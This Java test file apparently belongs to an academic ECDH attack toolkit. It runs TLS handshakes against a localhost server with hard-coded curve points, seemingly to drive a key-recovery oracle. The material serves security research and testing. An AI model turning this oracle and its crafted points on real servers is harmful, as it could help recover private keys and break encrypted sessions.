/*
 * 
 */
package de.rub.nds.ecdhattack.oracle;

import java.math.BigInteger;
import java.util.List;
import junit.framework.TestCase;
import org.testng.annotations.Test;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 */
public class ECDHOracleTest extends TestCase {

    private static final String HOST = "localhost";
    private static final int PORT = 55443;

    public ECDHOracleTest(String testName) {
        super(testName);
    }

    /**
     * Test of main method, of class ECDHOracle.
     */
    @Test
    public void testLaunchHandshakes() throws Exception {

        String baseX = "c85e4579d9e67a7741d0fff3333289917bb691927258c75f";
        String baseY = "8ccc95b75c655b92d25c06f26e3bbb64d5b82914601661a0";
        String[] xPossibilities = {"c85e4579d9e67a7741d0fff3333289917bb691927258c75f", "c85e4579d9e67a7741d0fff3333289917bb691927258c75f"};
        List s = ECDHOracle.launchHandshakes(HOST, PORT, baseX, baseY, xPossibilities);

        System.out.println(s);
    }
    
    /**
     * Test of main method, of class ECDHOracle.
     */
    @Test
    public void testLaunchHandshakes2() throws Exception {

        String baseX = "9d42769dfdbe113a851bb6b01b1a515d893b5adbc1f61329";
        String baseY = "74749ac0967a8ff4cc54d93187602dd67eb3d22970aca2ca";
        String[] xPossibilities = {"9d42769dfdbe113a851bb6b01b1a515d893b5adbc1f61329", "2431f9ec0d4a974817fec4250298fa227fe8b42079eaf822", "2431f9ec0d4a974817fec4250298fa227fe8b42079eaf822", "9d42769dfdbe113a851bb6b01b1a515d893b5adbc1f61329"};
        List s = ECDHOracle.launchHandshakes(HOST, PORT, baseX, baseY, xPossibilities);

        System.out.println(s);
    }
    
    /**
     * Test of main method, of class ECDHOracle.
     */
    @Test
    public void testLaunchHandshakes3() throws Exception {

        String baseX = "468b7d8c1d145b0817359578142f3a2465086c3a471c2126";
        String baseY = "61852e76434a667811f47f1fc4f80d69df3bcdccdc13f716";
        String[] xPossibilities = {"468b7d8c1d145b0817359578142f3a2465086c3a471c2126", "4add3c504b29025ae98903862369c39edb8d07d36da502b1", "178e496f67c822b0d33636bcb1e046f716d8d978d6e4cbc", "178e496f67c822b0d33636bcb1e046f716d8d978d6e4cbc", "4add3c504b29025ae98903862369c39edb8d07d36da502b1", "468b7d8c1d145b0817359578142f3a2465086c3a471c2126"};
        List s = ECDHOracle.launchHandshakes(HOST, PORT, baseX, baseY, xPossibilities);

        System.out.println(s);
    }
    
    @Test
    public void testBigInt() {
        BigInteger bi = new BigInteger("5708409594436356196045493209041238753517241791310830494926");
        System.out.println(bi.mod(BigInteger.valueOf(5)));
        System.out.println(bi.mod(BigInteger.valueOf(7)));
    }
    
}
